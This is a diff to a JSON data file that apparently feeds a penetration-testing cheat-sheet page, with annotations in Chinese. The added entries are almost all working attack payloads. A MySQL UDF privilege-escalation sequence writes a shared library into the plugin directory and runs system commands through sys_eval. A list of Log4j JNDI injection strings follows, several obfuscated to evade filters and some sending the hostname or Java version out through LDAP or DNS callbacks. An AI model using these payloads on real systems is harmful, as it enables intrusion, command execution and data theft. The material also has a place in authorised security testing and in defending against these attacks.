@@ -8,15 +8,15 @@ getData([
               {
                 "annotation": [
                   "\u67e5\u770b\u7248\u672c\u4fe1\u606f",
-                  " ",
-                  " ",
-                  " "
+                  "",
+                  "",
+                  ""
                 ],
                 "content-h4": [
-                  "cat /etc/issue      ",
-                  "cat /etc/*-release      ",
-                  "cat /etc/lsb-release      ",
-                  "cat /etc/redhat-release      "
+                  "cat /etc/issue         ",
+                  "cat /etc/*-release         ",
+                  "cat /etc/lsb-release         ",
+                  "cat /etc/redhat-release        "
                 ]
               }
             ],
@@ -729,6 +729,35 @@ getData([
               }
             ],
             "card-item-h4": "\u57fa\u7840\u67e5\u8be2"
+          },
+          {
+            "card-item-content-h4": [
+              {
+                "annotation": [
+                  "\u67e5\u770b\u4e3b\u673a\u7248\u672c\u53ca\u67b6\u6784",
+                  "\u67e5\u770b plugin \u76ee\u5f55\uff08/usr/lib/mysql/plugin/\uff09",
+                  " hex\u4e32\u53ef\u53c2\u8003https://www.sqlsec.com/tools/udf.html",
+                  "\u63d2\u5165\u5b58\u5728\u957f\u5ea6\u9650\u5236\u65f6\u53ef\u4f7f\u7528",
+                  "",
+                  "",
+                  "",
+                  "",
+                  ""
+                ],
+                "content-h4": [
+                  "show variables like '%compile%';   ",
+                  "show variables like 'plugin%';       ",
+                  "SELECT 0x7f454c460201010000000.......00000 INTO DUMPFILE '/usr/lib/mysql/udf.so';  ",
+                  "create table temp(data longblob);          ",
+                  "insert into temp(data) values (0x4d5a9000......);",
+                  "update temp set data = concat(data,0x33c2e......);",
+                  "select data from temp into dumpfile '/usr/lib/mysql/plugin/udf.so';",
+                  "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';         ",
+                  "select sys_eval('whoami');"
+                ]
+              }
+            ],
+            "card-item-h4": "UDF\u63d0\u6743"
           }
         ],
         "card-item-header": "MYSQL"
@@ -872,7 +901,7 @@ getData([
         "card-item-header": "Redis"
       }
     ],
-    "left-nav-title": "SQL injection"
+    "left-nav-title": "Database"
   },
   {
     "card-item-content": [
@@ -1467,6 +1496,53 @@ getData([
         "card-item-header": "fastjson"
       }
     ],
-    "left-nav-title": "Fastjson\u68c0\u6d4b"
+    "left-nav-title": "Fastjson"
+  },
+  {
+    "card-item-content": [
+      {
+        "card-item-body": [
+          {
+            "card-item-content-h4": [
+              {
+                "annotation": [
+                  "",
+                  "",
+                  "",
+                  "",
+                  "",
+                  "",
+                  "",
+                  "",
+                  "",
+                  "",
+                  "",
+                  "",
+                  " \u5927\u91cf\u53ef\u4ee5\u9020\u6210dos"
+                ],
+                "content-h4": [
+                  "${jndi:ldap://127.0.0.1:7777/${hostname}}",
+                  "${jndi:dns://127.0.0.1:6666/${hostName}}",
+                  "${jndi:ldap://127.0.0.1:1389}",
+                  "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/poc}",
+                  "${${::-j}ndi:rmi://127.0.0.1:1389/ass}",
+                  "${jndi:rmi://127.0.0.1:1389}",
+                  "${${lower:jndi}:${lower:rmi}://127.0.0.1:1389/poc}",
+                  "${${lower:${lower:jndi}}:${lower:rmi}://127.0.0.1:1389/poc}",
+                  "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://127.0.0.1:1389/poc}",
+                  "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://127.0.0.1:1389/poc}",
+                  "${jndi:ldap://${sys:java.version}.domain/a}",
+                  "${jndi:ldap://${hostName}.domain/a}",
+                  "${jndi:ldap://127.0.0.1}${jndi:ldap://127.0.0.1}.....${jndi:ldap://127.0.0.1}   "
+                ]
+              }
+            ],
+            "card-item-h4": "log4j-rce"
+          }
+        ],
+        "card-item-header": "log4j-rce"
+      }
+    ],
+    "left-nav-title": "Log4j-RCE"
   }
 ])
